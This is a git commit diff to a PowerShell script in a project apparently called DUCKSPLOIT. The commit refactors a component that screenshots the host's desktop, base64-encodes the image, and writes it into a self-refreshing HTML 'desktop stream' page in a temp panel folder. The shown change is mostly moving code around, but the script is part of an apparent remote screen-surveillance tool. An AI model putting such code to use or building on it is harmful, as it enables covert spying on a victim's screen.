4b14d52e866d775b4a09562159ddfa00535e1ba3
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-07-08 15:46:46 +0200

    Update desktop_stream.ps1

--- api/scripts/desktop_stream.ps1
+++ api/scripts/desktop_stream.ps1
@@ -2,6 +2,26 @@ Add-Type -AssemblyName System.Windows.Forms
 $screen_cnt  = [System.Windows.Forms.Screen]::AllScreens.Count
 $col_screens = [system.windows.forms.screen]::AllScreens
 
+$string = @"
+<html>
+    <head>
+        <title>Streaming Desktop - DUCKSPLOIT</title>
+		<link rel="icon" type="image/x-icon" href="https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/icon.ico?raw=true">
+    </head>
+    <body style="background-color:black;">
+	<!-- text-align: center; -->
+        <h1 style="color:white"><strong>DuckSploit - Desktop Stream</strong></h1>
+		<img id="img" src="data:image/png;base64, <base64>" alt="image" width="600" height="300"/>
+<script>
+document.body.style.zoom="900%"
+var intervalId = window.setInterval(function(){
+	location.reload();
+}, 1000);
+</script>
+    </body>
+</html>
+"@
+
 $info_screens = ($col_screens | ForEach-Object {
 $width = "$($_.Bounds.Width)"
 $height = "$($_.Bounds.Height)"
@@ -28,29 +48,6 @@ $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $width, $height)
 # output_path
 screenshot $bounds "$env:TEMP/host/host/pannel/temp/last.jpg"
 $base64 = [convert]::ToBase64String((get-content "$env:TEMP/host/host/pannel/temp/last.jpg" -encoding byte))
-$string = @”
-<html>
-    <head>
-        <title>Streaming Desktop - DUCKSPLOIT</title>
-		<link rel="icon" type="image/x-icon" href="https://github.com/canarddu38/DUCKSPLOIT/blob/root/images/icon.ico?raw=true">
-    </head>
-    <body style="background-color:black;">
-	<!-- text-align: center; -->
-        <h1 style="color:white"><strong>DuckSploit - Desktop Stream</strong></h1>
-		<img id="img" src="data:image/png;base64, <base64>" alt="image" width="600" height="300"/>
-<script>
-document.body.style.zoom="900%"
-var intervalId = window.setInterval(function(){
-	location.reload();
-}, 1000);
-</script>
-    </body>
-</html>
-“@
-$string.replace('<base64>',$base64)
-$string | Out-File -FilePath "$env:TEMP/host/host/pannel/desktop_stream.html"
+$string.replace('<base64>',$base64) | Out-File -FilePath "$env:TEMP\\host\\host\\pannel\\desktop_stream.html"
 start-sleep -seconds 1
 }
-
-
-
